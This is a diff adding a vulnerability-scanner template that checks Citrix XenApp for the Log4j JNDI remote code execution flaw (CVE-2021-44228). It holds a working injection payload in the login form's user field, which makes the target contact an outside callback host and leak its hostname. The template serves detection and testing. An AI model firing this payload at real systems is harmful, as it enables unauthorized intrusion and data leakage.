@@ -1,0 +1,33 @@
+id: citrix-xenapp-log4j-rce
+brief:
+    title: Citrix XenApp - Remote Code Execution (Apache Log4j)
+    by: shaikhyaser
+    level: critical
+    about: Citrix XenApp is susceptible to Log4j JNDI remote code execution. Citrix Virtual Apps is an application virtualization software produced by Citrix Systems that allows Windows applications to be acc...
+    label:
+        - cve
+        - cve2021
+        - rce
+        - jndi
+        - log4j
+        - citrix
+        - oast
+        - kev
+        - vuln
+    score: CVE-2021-44228 CVSS:10.0
+moves:
+    - verb: POST
+      to:
+        - '{{BaseURL}}/Citrix/XenApp/auth/login.aspx'
+      head:
+        Content-Type: application/x-www-form-urlencoded
+        Cookie: WIClientInfo="clientConnSecure#false";
+        Origin: '{{RootURL}}'
+        Referer: '{{RootURL}}/Citrix/XenApp/auth/login.aspx?CTX_MessageType=WARNING&CTX_MessageKey=NoUsableClientDetected'
+      body: LoginType=Explicit&user=${jndi:ldap://${:-{{rand1}}}${:-{{rand2}}}.${hostName}.username.{{interactsh-url}}/{{str}}}&password={{str}}
+      signs:
+        - "on": word
+          has:
+            - dns
+          in: interactsh_protocol
+          need: all
